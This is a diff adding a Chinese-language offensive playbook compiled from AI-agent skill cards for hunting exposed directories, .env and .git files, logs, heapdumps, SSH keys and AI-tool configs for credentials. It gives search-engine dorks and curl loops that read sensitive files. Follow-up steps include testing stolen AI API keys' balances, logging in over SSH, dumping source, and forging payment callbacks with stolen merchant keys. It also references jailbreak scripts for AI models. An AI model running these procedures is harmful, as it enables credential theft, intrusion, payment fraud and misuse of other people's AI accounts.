@@ -1,0 +1,145 @@
+---
+title: "敏感目录与日志泄露手法.md"
+generated: 2026-10-21
+kind: consolidated-playbook
+note: 由现役技能卡自动汇总；保留原卡语义，未改写攻防步骤
+---
+
+# 敏感目录与日志泄露手法.md
+
+> 本页由引用该路径的现役技能卡汇总生成。原始内容与完整步骤见下方来源卡；不要把它当成独立的新打法。
+
+## 来源卡
+
+- `/root/.hermes/skills/security/sensitive-dir-dump/SKILL.md`
+
+## 汇总内容
+
+### sensitive-dir-dump
+
+来源：`/root/.hermes/skills/security/sensitive-dir-dump/SKILL.md`
+
+# 敏感目录与日志泄露
+
+**前提**：目标在 scope。FOFA/Shodan 必须带 `domain="授权域"`，禁止无域全网扫。
+
+**不要走**：主机后渗透 LSASS / 浏览器密 → `credential-harvest`；路径穿越 → `lfi-rfi-exploit`；Vite `@fs` → `vite-fs-read`。
+
+**成功口径**
+
+| 档 | 成立 | 不算 |
+|----|------|------|
+| L1 | `Index of /` 或 href 标签 | 空 403 |
+| L2 | 口令/key 片段，或 SSH `whoami` 成功 | 仅目录名 |
+| L3 | `--verify-balance` 后供应商返回模型列表/额度 | 没带旗标；chat 耗量 |
+
+```bash
+python3 tools/ops/sensitive_dir_dump_probe.py doctor
+python3 tools/ops/sensitive_dir_dump_probe.py dump --base https://授权站 --case <案卷>
+python3 tools/ops/sensitive_dir_dump_probe.py hunt --base https://授权站 --case <案卷>
+# 你点头后再验余额
+python3 tools/ops/sensitive_dir_dump_probe.py hunt --base https://授权站 --case <案卷> --verify-balance
+python3 tools/ops/sensitive_dir_dump_probe.py space-queries --domain 授权域
+python3 tools/ops/sensitive_dir_dump_probe.py space-hunt --domain 授权域 --case <案卷> --tier extra,ai
+# --tier all 跑满 132 条；--then-hunt 对命中 URL 再 hunt
+# --wayback 拉 CDX（仍只留 in_scope）
+```
+
+## 闸
+
+- **SSH**：hunt 默认连，仅 `in_scope` host，只读 `whoami`。`--no-ssh` 关。禁止跳到 scope 外 IP。
+- **余额**：先问。不发 chat，只打 `/models` 或官方额度 GET。
+- **搜索**：只用本库 `config.yaml` 的 Yanbai VIP；禁止 `fofoapi.com`，禁止无 `domain=` 全网扫。
+- **堆**：listing/URL 出现 heapdump / `.hprof` → 立刻 `heap_cred_scan.py`（正则+蓝鸟），禁止只 `strings`。
+- **破限脚本**：韩立 Hermes patch / `hanli_injector.py` 不在本卡跑。高级模型身份走 `se_inject`。
+- raw 只落案卷 `测绘/dir_dump/raw/`；STATUS 只写片段。
+
+## 真源
+
+- `docs/playbooks/敏感目录与日志泄露手法.md`
+- PHP 发卡：`composer.json` 认栈；`storage/logs`/`laravel.log` 抽 `merchant_pem`/epay key → `payment-callback-forgery`（F-01，先于支付栈）
+
+---
+
+<!-- 补充视角: sensitive-dir-credential-hunt (兄弟技能库 2026-09-12) -->
+
+---
+name: sensitive-dir-credential-hunt
+description: "开放目录/敏感文件猎取时使用。触发: Index of, 目录遍历面, .env泄露, .git泄露, 凭证淘金。"
+version: 1.0.0
+license: MIT
+metadata:
+    related_skills: [path-traversal-pentest, heapdump-credential-hunter, userdata-grab, surveyengine-knowledge-pack]
+---
+
+# 敏感目录与凭证猎取(开放目录/空间引擎定向)
+
+## When to Use
+
+遇到正文顶部触发指纹/关键词时使用本技能(吸收自测绘引擎知识包)。完整卡全文: 镜像 `D:\博彩通杀\技能库\测绘引擎知识包\.cursor\skills\<原名>\SKILL.md`。
+
+
+来源: 测绘引擎知识包吸收(镜像 `.cursor\skills\sensitive-dir-dump\SKILL.md` + playbooks `docs/playbooks/敏感目录与日志泄露手法.md`)。
+
+**铁律**: 空间引擎搜索必须带 `domain="授权域"`/品牌词,禁止无域全网扫;只动授权目标。
+
+## 1. 猎取对象清单
+| 类别 | 目标 |
+|---|---|
+| 目录列表 | `Index of /`、Directory listing、href 标签 |
+| 源码/配置 | `.env`、`.git/config`、`.svn`、`composer.json`、`wp-config.php`、`config.php` |
+| 密钥/凭据 | `.ssh/`、`.aws/`、`.claude/`、`.cursor/`、`.codex/`、`tfstate`、`kubeconfig`、`docker-compose.yml`、`id_rsa` |
+| 日志/堆 | `storage/logs/laravel.log`、`*.hprof`/heapdump(→ heapdump-credential-hunter)、`*.log` |
+| AI 工具面 | `.hermes/`、`.openclaw/`(AI agent 配置常含 API key) |
+| 备份 | `*.bak`、`*.zip`、`*.tar.gz`、`backup/`、`www.zip` |
+
+## 2. 空间引擎定向查询(Fofa/Shodan/Censys)
+```
+# Fofa(带域约束)
+domain="target.com" && title="Index of /"
+domain="target.com" && (body=".env" || body="laravel.log")
+domain="target.com" && body="kubeconfig" || body="tfstate"
+cert="target.com" && (body="index of" || body="Directory listing")
+
+# Shodan(网页版不耗 credits)
+http.title:"Index of" hostname:target.com
+http.html:".env" hostname:target.com
+
+# Censys(新平台语法)
+host.services.endpoints.http.html_title:"Index of" and host.services.endpoints.http.html_body:".env"
+```
+Wayback: `curl "http://web.archive.org/cdx/search/cdx?url=target.com/*&output=json&filter=statuscode:200&collapse=urlkey"` 找历史暴露。
+
+## 3. 直测 URL(站点内)
+```bash
+# 目录列表探测
+for p in / /backup/ /data/ /uploads/ /files/ /logs/ /tmp/ /old/ /test/ /admin/; do
+  code=$(curl -s -o /tmp/r -w "%{http_code}" "https://target$p")
+  grep -qiE "index of|directory listing|<title>.*/</title>" /tmp/r && echo "LISTING: $p ($code)"
+done
+
+# 敏感文件直读
+for f in .env .git/config .svn/entries composer.json storage/logs/laravel.log \
+         wp-config.php config.php application.yml docker-compose.yml; do
+  code=$(curl -s -o /tmp/r -w "%{http_code}" "https://target/$f")
+  [ "$code" = "200" ] && echo "HIT: /$f ($(wc -c < /tmp/r)B)" && head -c 200 /tmp/r
+done
+```
+
+## 4. 命中后处理
+| 命中 | 下一步 |
+|---|---|
+| `.env` | APP_KEY/DB 凭据 → CVE-2018-15133 / 连库;Laravel 走 laravel-app-pentest |
+| `storage/logs/laravel.log` | 抽 `merchant_pem`/支付 key → callback-signature-forgery(F-01 先于支付栈) |
+| `.git/config` | git 泄露: GitHacker / `python3 githacker --url https://target/.git/ --folder /tmp/git` → 源码 |
+| heapdump | **heapdump-credential-hunter**(正则+对象图,禁止只 strings) |
+| composer.json | 认栈(PHP 框架/发卡);拿版本 → 对应框架技能 |
+| 云配置 | tfstate/kubeconfig → cloud-aws 等云技能 |
+
+## 成功口径
+| 档 | 条件 |
+|---|---|
+| L1 | 开放目录 `Index of /` 确认(空 403 不算) |
+| L2 | 拿到口令/key 片段/SSH who
+
+…（截断，全文见来源卡）
